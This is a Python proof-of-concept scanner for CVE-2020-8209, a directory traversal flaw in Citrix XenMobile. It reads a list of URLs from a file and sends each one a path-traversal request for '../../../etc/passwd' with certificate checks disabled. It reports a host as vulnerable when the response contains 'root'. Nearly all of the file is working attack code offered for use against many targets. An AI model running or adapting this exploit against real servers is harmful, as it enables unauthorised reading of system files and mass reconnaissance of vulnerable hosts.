#!/usr/bin/env python
# coding:utf-8
# author:B1anda0

import requests,sys,colorama
from colorama import *
init(autoreset=True)


banner='''
 .d8888b. 888     8888888888888      .d8888b.  .d8888b.  .d8888b.  .d8888b.        .d8888b.  .d8888b.  .d8888b.  .d8888b.  
d88P  Y88b888     888888            d88P  Y88bd88P  Y88bd88P  Y88bd88P  Y88b      d88P  Y88bd88P  Y88bd88P  Y88bd88P  Y88b 
888    888888     888888                   888888    888       888888    888      Y88b. d88P       888888    888888    888 
888       Y88b   d88P8888888             .d88P888    888     .d88P888    888       "Y88888"      .d88P888    888Y88b. d888 
888        Y88b d88P 888             .od888P" 888    888 .od888P" 888    888      .d8P""Y8b. .od888P" 888    888 "Y888P888 
888    888  Y88o88P  888      888888d88P"     888    888d88P"     888    888888888888    888d88P"     888    888       888 
Y88b  d88P   Y888P   888            888"      Y88b  d88P888"      Y88b  d88P      Y88b  d88P888"      Y88b  d88PY88b  d88P 
 "Y8888P"     Y8P    8888888888     888888888  "Y8888P" 888888888  "Y8888P"        "Y8888P" 888888888  "Y8888P"  "Y8888P"                                                                            
'''


def XenMobile():
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	payload= '/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd'
	poc=urls+payload
	try:
		requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
		response=requests.get(poc,headers=headers,timeout=10,verify=False)
		if response.status_code==200 and "root" in response.content:
			print(u'\033[1;31;40m[+]{} 存在Citrix XenMobile 目录遍历漏洞'.format(urls))
		else:
			print('[-]{} None'.format(urls))
	except:
		print(u'{} 请求超时'.format(urls))


if __name__ == '__main__':
	print (banner)
	if len(sys.argv)!=2:
		print('Example:python CVE-2020-8209-Multiple.py url.txt')
	else:
		file = open(sys.argv[1])
		for url in file.readlines():
			urls=url.strip()
			XenMobile()
		print ('Check Over')
